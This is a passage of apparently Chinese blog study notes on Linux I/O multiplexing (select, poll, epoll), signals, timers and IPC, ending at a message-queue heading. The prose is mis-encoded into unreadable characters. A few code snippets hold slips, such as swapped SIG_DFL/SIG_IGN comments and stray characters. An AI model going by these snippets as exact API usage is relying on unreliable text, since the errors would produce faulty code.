<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//selectè°ƒç”¨åŸå‹</span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/select.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">select</span> <span class="p">(</span><span class="kt">int</span> <span class="n">nfds</span><span class="p">,</span> <span class="n">fd_set</span><span class="o">*</span> <span class="n">readfds</span><span class="p">,</span> <span class="n">fd_set</span><span class="o">*</span> <span class="n">writefds</span><span class="p">,</span> <span class="n">fd_set</span><span class="o">*</span> <span class="n">exceptfds</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">timeval</span><span class="o">*</span> <span class="n">timeout</span><span class="p">);</span>
<span class="cm">/*
  nfds:è¢«ç›‘å¬çš„æ–‡ä»¶æè¿°ç¬¦æ€»æ•°ï¼Œé€šå¸¸æ˜¯selectç›‘å¬çš„æ–‡ä»¶æè¿°ç¬¦æœ€å¤§å€¼+1
  åä¸‰è€…åˆ†åˆ«å¯¹åº”å¯è¯»ã€å¯å†™ã€å¼‚å¸¸æ–‡ä»¶æè¿°ç¬¦åˆé›†ï¼Œå†…æ ¸é€šè¿‡ä¿®æ”¹å®ƒä»¬æ¥é€šçŸ¥å“ªäº›æ–‡ä»¶æè¿°ç¬¦å·²å°±ç»ªã€‚
  timevalï¼šselectè¶…æ—¶æ—¶é—´ å¦‚æœä¼ é€’0 åˆ™ä¸ºéé˜»å¡, è®¾ç½®ä¸ºNULLåˆ™ä¸ºé˜»å¡
*/</span>

<span class="c1">//fd_setç»“æ„ä½“ä»…ä»…åŒ…å«ä¸€ä¸ªæ•´å½¢æ•°ç»„ï¼Œè¯¥æ•°ç»„æ¯ä¸ªå…ƒç´ çš„æ¯ä¸€ä½æ ‡è®°ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦</span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/select.h&gt;</span><span class="cp">
</span><span class="n">FD_ZERO</span><span class="p">(</span><span class="n">fd_set</span> <span class="o">*</span><span class="n">fdset</span><span class="p">);</span>        <span class="c1">//æ¸…é™¤fdsetçš„æ‰€æœ‰ä½</span>
<span class="n">FD_SET</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span><span class="n">fd_set</span> <span class="o">*</span><span class="n">fdset</span><span class="p">);</span>  <span class="c1">//è®¾ç½®fdsetçš„fdä½</span>
<span class="n">FD_CLR</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span><span class="n">fd_set</span> <span class="o">*</span><span class="n">fdset</span><span class="p">);</span>  <span class="c1">//æ¸…é™¤fdsetçš„fdä½</span>
<span class="kt">int</span> <span class="nf">FD_ISSET</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span><span class="n">fd_set</span> <span class="o">*</span><span class="n">fdset</span><span class="p">));</span><span class="err">ã€</span><span class="c1">//æ£€æŸ¥fdsetçš„fdä½æ˜¯å¦è¢«è®¾ç½®</span>

</code></pre></div></div>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">FD_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">readset</span><span class="p">);</span>
<span class="n">FD_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">writeset</span><span class="p">);</span>
<span class="n">FD_SET</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">readset</span><span class="p">);</span>
<span class="n">FD_SET</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">readset</span><span class="p">);</span>
<span class="n">FD_SET</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">writeset</span><span class="p">);</span>
<span class="n">FD_SET</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">writeset</span><span class="p">);</span>
<span class="n">select</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">readset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">writeset</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>

<p>å¯¹åº”fd_setå›¾ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002527.png" alt="image-20220423131007025" /></p>

<p>ä¸Šé¢çš„ä¾‹å­åˆšå¼€å§‹æˆ‘æœ‰ä¸¤ä¸ªç–‘é—®ï¼š</p>

<ol>
  <li>ä¸ºä»€ä¹ˆselectå‰éƒ½è¦é‡æ–°è®¾ç½®æ–‡ä»¶æè¿°ç¬¦</li>
  <li>ä¸ºä»€ä¹ˆselectå‰è®¾ç½®äº†FD_SETï¼Œä¹‹ååˆç”¨FD_ISSETåˆ¤æ–­</li>
</ol>

<p>åŸå› å…¶å®å°±æ˜¯äº‹ä»¶å‘ç”Ÿåï¼Œä¼šé‡æ–°è®¾ç½®fd_setï¼Œæ²¡æœ‰äº‹ä»¶å‘ç”Ÿçš„fdä½ä¼šè¢«æ¸…ç©ºã€‚</p>

<p>æœ‰å“ªä¸€äº›äº‹ä»¶å¯ä»¥å½’äºå¯è¯»ã€å¯å†™ã€å¼‚å¸¸ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002533.png" alt="image-20220423132105311" /></p>

<h3 id="poll">poll</h3>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;poll.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">poll</span><span class="p">(</span><span class="k">struct</span> <span class="nc">pollfd</span><span class="o">*</span> <span class="n">fds</span><span class="p">,</span> <span class="n">nfds_t</span> <span class="n">nfds</span><span class="p">,</span> <span class="kt">int</span> <span class="n">timeout</span><span class="p">);</span>
<span class="cm">/*
  fds: pollfd ç»“æ„ä½“ç±»å‹æ•°ç»„,æŒ‡å®šæ–‡ä»¶æè¿°ç¬¦ä¸Šå‘ç”Ÿçš„å¯è¯»å¯å†™å’Œå¼‚å¸¸äº‹ä»¶
  nfdsï¼šè¢«ç›‘å¬é›†åˆfdså¤§å°
  timeout å•ä½ä¸ºæ¯«ç§’ -1 ä¸ºé˜»å¡, 0 ä¸ºç«‹å³è¿”å›
*/</span>
<span class="k">struct</span> <span class="nc">pollfd</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
	<span class="kt">short</span> <span class="n">events</span><span class="p">;</span>  <span class="c1">//æ³¨å†Œçš„äº‹ä»¶, å‘ŠçŸ¥pollç›‘å¬fdä¸Šçš„å“ªäº›äº‹ä»¶</span>
	<span class="kt">short</span> <span class="n">revents</span><span class="p">;</span> <span class="c1">// å®é™…å‘ç”Ÿçš„äº‹ä»¶</span>
<span class="p">}</span>
</code></pre></div></div>

<p>pollæ”¯æŒçš„äº‹ä»¶ç±»å‹ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002555.png" alt="image-20220423152027889" /></p>

<p>ç»“åˆä¹¦ä¸Šä¾‹å­ç”¨pollå†™äº†ä¸€ä¸ªèŠå¤©å®¤ï¼Œæ„Ÿè§‰ç”¨èµ·æ¥çš„ç¡®æ¯”selectæ–¹ä¾¿ä¸€äº›</p>

<h3 id="epoll">epoll</h3>

<p>epollåº•å±‚ä½¿ç”¨äº†çº¢é»‘æ ‘ï¼Œæ€§èƒ½æ–¹é¢æœ€å¥½ï¼Œç›¸å¯¹è€Œè¨€ä¹Ÿæ˜¯ç”¨çš„æœ€å¤šçš„</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//1. åˆ›å»ºepollå®ä¾‹ï¼Œåœ¨å†…æ ¸ä¸­æ³¨å†Œä¸€ä¸ªæ•°æ®</span>
<span class="c1">//å¤±è´¥è¿”å›-1ï¼ŒæˆåŠŸè¿”å›epollå®ä¾‹æè¿°ç¬¦</span>
<span class="kt">int</span> <span class="nf">epoll_create</span><span class="p">(</span><span class="kt">int</span> <span class="n">size</span><span class="p">);</span> <span class="c1">//è‡ªä»Linux 2.6.8 sizeå‚æ•°æ²¡æœ‰æ„ä¹‰ï¼Œä½†ä¸èƒ½è®¾ç½®ä¸º0</span>

<span class="c1">//2. æ“ä½œepollå®ä¾‹ï¼Œå¯¹å†…æ ¸æ—¶é—´è¡¨è¿›è¡Œå¢æ·»ã€åˆ é™¤ã€ä¿®æ”¹æ“ä½œ</span>
<span class="kt">int</span> <span class="nf">epoll_ctl</span><span class="p">(</span><span class="kt">int</span> <span class="n">epfd</span><span class="p">,</span><span class="kt">int</span> <span class="n">op</span><span class="p">,</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span><span class="k">struct</span> <span class="nc">epoll_event</span> <span class="o">*</span><span class="n">event</span><span class="p">);</span>
<span class="cm">/*
  epfdï¼šepollå®ä¾‹æè¿°ç¬¦
  fd: è¦æ£€æµ‹çš„æ–‡ä»¶æè¿°ç¬¦
  opï¼šéœ€è¦è¿›è¡Œçš„æ“ä½œï¼š
  	EPOLL_CTL_ADDï¼šæ·»åŠ 
  	EPOLL_CTL_DELï¼šåˆ é™¤
  	EPOLL_CTL_MODï¼šä¿®æ”¹
  eventï¼šæ£€æµ‹æ–‡ä»¶æè¿°ç¬¦çš„å…·ä½“äº‹ä»¶
*/</span>
<span class="k">struct</span> <span class="nc">epoll_events</span>
<span class="p">{</span>
    <span class="n">_uint32_t</span> <span class="n">events</span><span class="p">;</span> <span class="c1">//epolläº‹ä»¶ç±»å‹ï¼Œå’ŒpollåŸºæœ¬ä¸Šç±»ä¼¼ï¼Œéœ€è¦åœ¨pollçš„å¯¹åº”å®åŸºç¡€ä¸ŠåŠ ä¸Šâ€˜Eâ€™ï¼Œä¸¤ä¸ªé¢å¤–çš„äº‹ä»¶ç±»å‹EPOLLETå’ŒEPOLLONESHOT</span>
    <span class="n">epoll_data_t</span> <span class="n">data</span><span class="p">;</span><span class="c1">//unionç±»å‹ï¼Œå…¶ä¸­çš„fdéœ€è¦è®¾ç½®</span>
<span class="p">}</span>

<span class="c1">//3. æ£€æµ‹epollå®ä¾‹</span>
<span class="c1">//æˆåŠŸå·²å°±ç»ªçš„æ–‡ä»¶æè¿°ç¬¦ä¸ªæ•°ï¼Œå¤±è´¥è¿”å›-1</span>
<span class="kt">int</span> <span class="nf">epoll_wait</span><span class="p">(</span><span class="kt">int</span> <span class="n">epfd</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">epoll_event</span> <span class="o">*</span><span class="n">events</span><span class="p">,</span><span class="kt">int</span> <span class="n">maxevents</span><span class="p">,</span> <span class="kt">int</span> <span class="n">timeout</span><span class="p">);</span>
<span class="cm">/*
  epfd:epollå®ä¾‹çš„æ–‡ä»¶æè¿°ç¬¦
  eventsï¼šä¼ å‡ºå‚æ•°ï¼Œæ ¹æ®epfdä»å†…æ ¸äº‹ä»¶è¡¨ä¸­æŠŠæ‰€æœ‰å·²å°±ç»ªçš„äº‹ä»¶å¤åˆ¶åˆ°eventsç»“æ„ä½“æ•°ç»„ä¸­
  maxeventsï¼ševentsç»“æ„ä½“æ•°ç»„å¤§å°
  timeoutï¼š-1å µå¡ï¼Œå¤§äºç­‰äº0è¡¨ç¤ºå µå¡æ—¶é—´
*/</span>
</code></pre></div></div>

<p>epollå’Œpollæœ€å¤§  å·®å¼‚åœ¨äºï¼š</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ç´¢å¼•pollè¿”å›çš„å°±ç»ªæ–‡ä»¶æè¿°ç¬¦</span>
<span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">poll</span><span class="p">(</span><span class="n">fds</span><span class="p">,</span> <span class="n">MAX_EVENT_NUMBER</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
<span class="c1">// éå†</span>
<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_EVENT_NUMBER</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span><span class="p">(</span><span class="n">fds</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">revents</span> <span class="o">&amp;</span> <span class="n">POLLIN</span><span class="p">)</span> <span class="p">{</span>
		<span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">fds</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">fd</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="c1">// ç´¢å¼•epollè¿”å›çš„å°±ç»ªæ–‡ä»¶æè¿°ç¬¦</span>
<span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">epoll_wait</span><span class="p">(</span><span class="n">epoll_fd</span><span class="p">,</span> <span class="n">events</span><span class="p">,</span> <span class="n">MAX_EVENT_NUMBER</span><span class="p">,</span>  <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ret</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">events</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">data</span><span class="p">.</span><span class="n">fd</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>epollåˆ†LTï¼ˆLevel Triggerï¼‰å’ŒETï¼ˆEdge Triggerï¼‰ä¸¤ç§æ¨¡å¼ï¼ŒLTæ˜¯é»˜è®¤æ¨¡å¼ï¼Œé€šçŸ¥ä¸€ä¸ªäº‹ä»¶ï¼Œç¨‹åºå¯èƒ½ä¸ä¼šé©¬ä¸Šå¤„ç†å®Œæ¯•ï¼Œé‚£ä¹ˆä¸‹æ¬¡è¿˜ä¼šé€šå‘Šæ­¤äº‹ä»¶ï¼›ETæ˜¯é«˜æ•ˆæ¨¡å¼ï¼Œåªé€šçŸ¥ä¸€æ¬¡ï¼Œæ‰€ä»¥å¿…é¡»åšå®Œã€‚</p>

<p>å¯¹æ¯”LTå’ŒETï¼Œå¯¹äºBUFFER_SIZEåªæœ‰10çš„æƒ…å†µï¼š</p>

<p>LTï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002600.png" alt="image-20220425224459784" /></p>

<p>é™¤å»æ¢è¡Œç¬¦å‡ºå‘äº†4æ¬¡äº‹ä»¶</p>

<p>ETï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002607.png" alt="image-20220425224728772" /></p>

<p>åªè§¦å‘äº†ä¸€æ¬¡</p>

<h3 id="ä¸‰ç»„ioå¤ç”¨çš„æ¯”è¾ƒ">ä¸‰ç»„I/Oå¤ç”¨çš„æ¯”è¾ƒ</h3>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002603.png" alt="image-20220425225318528" /></p>

<h2 id="ä¿¡å·">ä¿¡å·</h2>

<blockquote>
  <p>ä¿¡å·æ˜¯ç”±ç”¨æˆ·ã€ç³»ç»Ÿæˆ–è€…è¿›ç¨‹å‘é€ç»™ç”¨æˆ·è¿›ç¨‹çš„ä¿¡æ¯ï¼Œä»¥é€šçŸ¥ç›®æ ‡è¿›ç¨‹æŸä¸ªçŠ¶æ€çš„æ”¹å˜æˆ–è€…ç³»ç»Ÿå¼‚å¸¸</p>
</blockquote>

<p>Linuä¿¡å·å¯ç”±å¦‚ä¸‹ä¿¡å·æ¡ä»¶äº§ç”Ÿï¼š</p>

<ul>
  <li>å‰å°è¿›ç¨‹ <code class="language-plaintext highlighter-rouge">Ctrl+C</code>å‘é€ä¸­æ–­è¿›ç¨‹</li>
  <li>ç³»ç»Ÿå¼‚å¸¸ã€‚æ¯”å¦‚æµ®ç‚¹å¼‚å¸¸æˆ–è€…éæ³•å†…å­˜æ®µå¼‚å¸¸ã€‚</li>
  <li>ç³»ç»ŸçŠ¶æ€å˜åŒ–ã€‚æ¯”å¦‚alarmå®šæ—¶å™¨å¼•èµ·SIGALRMä¿¡å·ã€‚</li>
  <li>è¿è¡Œkillå‘½ä»¤æˆ–è°ƒç”¨killå‡½æ•°</li>
</ul>

<p>å‘é€ä¿¡å·ï¼š</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">kill</span><span class="p">(</span><span class="n">pid_t</span> <span class="n">pid</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sig</span><span class="p">);</span>
<span class="cm">/*
  pid &gt; 0 å‘é€ç»™PIDä¸ºpidæ ‡è¯†çš„è¿›ç¨‹
  0 å‘é€ç»™æœ¬è¿›ç¨‹ç»„çš„å…¶ä»–è¿›ç¨‹
  -1 å‘é€ç»™è¿›ç¨‹ä»¥å¤–çš„æ‰€æœ‰è¿›ç¨‹, ä½†å‘é€è€…éœ€è¦æœ‰å¯¹ç›®æ ‡è¿›ç¨‹å‘é€ä¿¡å·çš„æƒé™
  &lt; -1 å‘é€ç»™ç»„IDä¸º -pid çš„è¿›ç¨‹ç»„ä¸­çš„æ‰€æœ‰æˆå‘˜

   å‡ºé”™ä¿¡æ¯ EINVAL æ— æ•ˆä¿¡å·, EPERM è¯¥è¿›ç¨‹æ²¡æœ‰æƒé™ç»™ä»»ä½•ä¸€ä¸ªç›®æ ‡è¿›ç¨‹ ESRCH ç›®æ ‡è¿›ç¨‹(ç»„) ä¸å­˜åœ¨
   sigå…·ä½“åœ¨bits/signum.hä¸­
*/</span>
</code></pre></div></div>

<p>alarmå®šæ—¶å™¨ï¼šä½¿ç”¨<code class="language-plaintext highlighter-rouge">alarm</code>å‡½æ•°å¯è®¾ç½®å¯ä»¥å®šæ—¶å™¨ï¼Œåœ¨æœªæ¥æŸä¸ªæ—¶é—´å®šæ—¶å™¨ä¼šè¶…æ—¶ï¼Œäº§ç”Ÿ<code class="language-plaintext highlighter-rouge">SIGALRM</code>ä¿¡å·ï¼Œå¦‚æœå¿½ç•¥æˆ–è€…ä¸æ•æ‰ä¿¡å·ï¼Œé»˜è®¤åŠ¨ä½œæ˜¯ç»ˆæ­¢è°ƒç”¨è¯¥<code class="language-plaintext highlighter-rouge">alarm</code>å‡½æ•°çš„è¿›ç¨‹ã€‚</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">alarm</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">seconds</span><span class="p">);</span>
</code></pre></div></div>

<p>ä¿¡å·å¤„ç†æ–¹å¼ï¼š</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// å¿½ç•¥ç›®æ ‡ä¿¡å·</span>
<span class="cp">#define SIG_DFL ((_sighandler_t) 0)
</span><span class="c1">// ä½¿ç”¨ä¿¡å·çš„é»˜è®¤å¤„ç†æ–¹å¼</span>
<span class="cp">#define SIG_IGN ((_sighandler_t) 1)
</span>
<span class="c1">//ä¸ºå•ç‹¬çš„ä¿¡å·è®¾ç½®å¤„ç†å‡½æ•°</span>
<span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
</span><span class="c1">// _handler æŒ‡å®šsigçš„å¤„ç†å‡½æ•°</span>
<span class="n">_sighandler_t</span> <span class="nf">signal</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">,</span> <span class="n">__sighandler_t</span> <span class="n">_handler</span><span class="p">)</span>

<span class="kt">int</span> <span class="n">sigaction</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">sigaction</span><span class="o">*</span> <span class="n">act</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">sigaction</span><span class="o">*</span> <span class="n">oact</span><span class="p">);</span>
<span class="c1">//ä¸€ä¸ªä¾‹å­</span>
<span class="kt">void</span> <span class="nf">addsig</span><span class="p">(</span> <span class="kt">int</span> <span class="n">sig</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="nc">sigaction</span> <span class="n">sa</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">sa</span> <span class="p">)</span> <span class="p">);</span>
    <span class="n">sa</span><span class="p">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="n">sig_handler</span><span class="p">;</span>
    <span class="n">sa</span><span class="p">.</span><span class="n">sa_flags</span> <span class="o">|=</span> <span class="n">SA_RESTART</span><span class="p">;</span>
    <span class="n">sigfillset</span><span class="p">(</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">.</span><span class="n">sa_mask</span> <span class="p">);</span>
    <span class="n">assert</span><span class="p">(</span> <span class="n">sigaction</span><span class="p">(</span> <span class="n">sig</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>## å®šæ—¶å™¨</p>

<h3 id="åŸºäºå‡åºé“¾è¡¨çš„è®¡æ—¶å™¨">åŸºäºå‡åºé“¾è¡¨çš„è®¡æ—¶å™¨</h3>

<p>è¯¦æƒ…è§<a href="https://github.com/raichen/LinuxServerCodes/blob/master/11/11-2lst_timer.h">ä¹¦ç±æºç </a>ï¼Œå‡åºé“¾è¡¨å¯æŒ‰ç…§æ´»åŠ¨æ—¶é—´æ’åºï¼Œæ ¸å¿ƒæ˜¯ä¸€ä¸ªå¿ƒæå‡½æ•°ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´æ£€æµ‹åˆ°æœŸçš„ä»»åŠ¡ã€‚</p>

<h3 id="æ—¶é—´è½®-and-æ—¶é—´å †">æ—¶é—´è½® And æ—¶é—´å †</h3>

<p>ğŸ¦ğŸ¦ğŸ¦</p>

<h2 id="å¤šè¿›ç¨‹ç¼–ç¨‹">å¤šè¿›ç¨‹ç¼–ç¨‹</h2>

<p>åŸºç¡€api..ï¼š</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fork</span><span class="p">;</span>
<span class="n">exec</span><span class="p">;</span>
<span class="n">exit</span><span class="p">;</span>
<span class="n">wait</span><span class="p">;</span>
<span class="n">waitpid</span><span class="p">;</span>
<span class="n">chdir</span><span class="p">;</span><span class="c1">//ä¿®æ”¹å½“å‰å·¥ä½œç›®å½•</span>
</code></pre></div></div>

<h3 id="è¿›ç¨‹é—´é€šä¿¡inter-process-communicationipc">è¿›ç¨‹é—´é€šä¿¡ï¼ˆInter-Process Communicationï¼ŒIPCï¼‰</h3>

<h4 id="ç®¡é“-pipe">ç®¡é“ Pipe</h4>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002612.png" alt="image-20220430153557938" /></p>

<p>ç®¡é“æœ¬èº«æ˜¯å•å‘çš„ï¼Œå¯ä»¥ç”¨ä¸¤ä¸ªç®¡é“å®ç°åŒå‘ä¼ è¾“ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code class="language-plaintext highlighter-rouge">socketpair</code>æ¥åˆ›å»ºåŒå‘ç®¡é“ã€‚</p>

<h4 id="ä¿¡å·é‡-semophore">ä¿¡å·é‡ semophore</h4>

<p>ä¸»è¦ç”¨ä½œè¿›ç¨‹åŒæ­¥ï¼Œä»¥ç¡®ä¿æŸä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªè¿›ç¨‹å¯ä»¥æ‹¥æœ‰èµ„æºçš„ç‹¬å å¼è®¿é—®ã€‚</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//1. åˆ›å»ºä¿¡å·é‡</span>
<span class="c1">//åˆ›å»ºä¸€ä¸ªå…¨å±€å”¯ä¸€çš„ä¿¡å·é‡é›†, æˆ–è€…è·å–ä¸€ä¸ªå·²ç»å­˜åœ¨çš„ä¿¡å·é‡é›†</span>
<span class="kt">int</span> <span class="nf">semget</span><span class="p">(</span><span class="n">key_t</span> <span class="n">key</span><span class="p">,</span> <span class="kt">int</span> <span class="n">num_sems</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sem_flags</span><span class="p">);</span>
<span class="cm">/*
  key:æ‰€åˆ›å»ºä¿¡å·é›†çš„é”®å€¼ï¼Œéœ€è¦æ—¶å”¯ä¸€çš„éæ•´æ•°
  num_sens:åˆ›å»ºçš„ä¿¡å·é›†ä¸­çš„ä¿¡å·é‡ä¸ªæ•°ï¼Œä¸€èˆ¬ä¸º1ï¼Œè‹¥æ˜¯è·å–ä¸€ä¸ªå·²ç»å­˜åœ¨çš„é›†åˆï¼Œåˆ™ä¸º0
  sem_flags:0666|IPC_CREATã€ IPC_EXCL
*/</span>

<span class="c1">//2. ä¿¡å·é‡åˆå§‹åŒ–</span>
<span class="kt">int</span> <span class="nf">semctl</span><span class="p">(</span><span class="kt">int</span> <span class="n">sem_id</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sem_num</span><span class="p">,</span> <span class="kt">int</span> <span class="n">command</span><span class="p">,</span> <span class="p">...);</span>
<span class="cm">/*
  sem_id:semgetæ‰€è¿”å›çš„ä¿¡å·é‡æ ‡è¯†ç¬¦
  sem_num:è¢«æ“ä½œä¿¡å·é‡åœ¨ä¿¡å·é›†ä¸­çš„ç¼–å·
  command:å¦‚ä¸‹å›¾
  ...:commandæ‰€éœ€çš„å‚æ•°ï¼Œè”åˆæ•°æ®ç±»å‹
*/</span>
<span class="k">union</span> <span class="n">semun</span>
<span class="p">{</span>
	<span class="kt">int</span>              <span class="n">val</span><span class="p">;</span>    <span class="cm">/* Value for SETVAL */</span>
	<span class="k">struct</span> <span class="nc">semid_ds</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>    <span class="cm">/* Buffer for IPC_STAT, IPC_SET */</span>
	<span class="kt">unsigned</span> <span class="kt">short</span>  <span class="o">*</span><span class="n">array</span><span class="p">;</span>  <span class="cm">/* Array for GETALL, SETALL */</span>
	<span class="k">struct</span> <span class="nc">seminfo</span>  <span class="o">*</span><span class="n">__buf</span><span class="p">;</span>  <span class="cm">/* Buffer for IPC_INFO
								(Linux-specific) */</span>
<span class="p">};</span>
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002616.png" alt="image-20220430182402389" /></p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//3. æ“ä½œä¿¡å·é‡(PV)</span>
<span class="kt">void</span> <span class="nf">pv</span><span class="p">(</span><span class="kt">int</span> <span class="n">sem_id</span><span class="p">,</span><span class="kt">int</span> <span class="n">op</span><span class="p">){</span>
    <span class="k">struct</span> <span class="nc">sembuf</span> <span class="n">sem_b</span><span class="p">;</span>
    <span class="n">sem_b</span><span class="p">.</span><span class="n">sem_num</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="c1">//ä¿¡å·é‡ç¼–å·</span>
    <span class="n">sem_b</span><span class="p">.</span><span class="n">sem_op</span><span class="o">=</span><span class="n">op</span><span class="p">;</span> <span class="c1">//-1ä¸ºPæ“ä½œï¼Œ1ä¸ºVæ“ä½œ</span>
    <span class="n">sem_b</span><span class="p">.</span><span class="n">sem_flg</span><span class="o">=</span><span class="n">SEM_UNDO</span><span class="p">;</span>
    <span class="c1">// IPC_NOWAIT æ— è®ºä¿¡å·é‡æ“ä½œæ˜¯å¦æˆåŠŸ, éƒ½ç«‹å³è¿”å›</span>
	<span class="c1">// SEM_UNDOå½“è¿›ç¨‹é€€å‡ºçš„æ—¶å€™, å–æ¶ˆæ­£åœ¨è¿›è¡Œçš„semopæ“ä½œ PVæ“ä½œç³»ç»Ÿæ›´æ–°è¿›ç¨‹çš„semadjå˜é‡</span>
    <span class="n">semop</span><span class="p">(</span><span class="n">sem_id</span><span class="p">,</span><span class="o">&amp;</span><span class="n">sem_b</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="n">m</span>
<span class="p">}</span>
</code></pre></div></div>

<h4 id="æ¶ˆæ¯é˜Ÿåˆ—-message-queue">æ¶ˆæ¯é˜Ÿåˆ— message queue</h4>

<p>ä¸»è¦ç”¨ä½œè¿›ç¨‹é—´ä¼ é€’æ¶ˆæ¯ã€‚</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//1. åˆ›å»ºæ¶ˆæ¯é˜Ÿåˆ—</span>
